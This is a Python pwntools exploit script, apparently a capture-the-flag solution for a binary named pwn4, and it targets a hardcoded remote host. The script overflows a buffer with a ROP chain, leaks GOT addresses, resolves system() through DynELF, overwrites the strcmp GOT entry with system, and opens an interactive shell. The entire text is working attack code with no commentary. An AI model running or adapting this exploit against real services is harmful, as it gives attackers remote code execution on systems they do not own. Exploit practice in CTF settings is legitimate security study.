from pwn import *
gotwrite=0x603030
gotread=0x603050
gotstrcmp=0x603060
def vuln(fun,param1=0,param2=0,param3=0):
	if fun=='read':
		fun=gotread
	elif fun=='write':
		fun=gotwrite
	p.sendline('3')
	p.recvuntil('Modify:')
	p.sendline('111')
	p.recvuntil('name:')
	p.sendline('111')
	p.recvuntil(':')
	rop=0x40266A
	p.sendline('/bin/sh\x00'+'c'*64+p64(rop)+p64(0)+p64(1)+p64(fun)+p64(param3) + p64(param2) + p64(param1)+p64(0x402650)+'1'*56+p64(0x400DD0))
	p.recvuntil(':')
	p.sendline('600')
	p.recv()
	p.sendline('4')
	p.recvuntil('query:')
	p.sendline('111')
	p.recv()
def verify():
	p.sendline('1')
	p.recvuntil(':')
	p.sendline('c4ca4238a0b923820dcc509a6f75849b')
	p.recv()
def leak(addr):
	print 'leaking:'+hex(addr)
	vuln('write',1,addr,8)
	data=p.recvuntil('welcome',drop=1)[-8:]
	verify()
	print "%#x => %s" % (addr, (data or '').encode('hex'))
	return data
#p=process('./pwn4')
p=remote("114.55.62.233",8000)
p.recvuntil(':')
verify()
p.sendline('1')
p.recvuntil(':')
p.sendline('111')
p.recvuntil(':')
p.sendline('222')
p.recvuntil('exit')
p.sendline('1')
p.recvuntil(':')
p.sendline('3'*20)
p.recvuntil(':')
p.sendline('4'*50)
p.recvuntil('exit')

write=u64(leak(gotwrite))
read=u64(leak(gotread))
#d=p.recv()
d = DynELF(leak, elf=ELF('./pwn4'))
system_addr = d.lookup('system', 'libc')
print 'write:'+hex(write)
print 'read:'+hex(read)
print 'system:'+hex(system_addr)
vuln('read',0,gotstrcmp,8)
p.sendline(p64(system_addr))
verify()
p.sendline('2')
p.recv()
p.sendline('/bin/sh')
p.interactive()
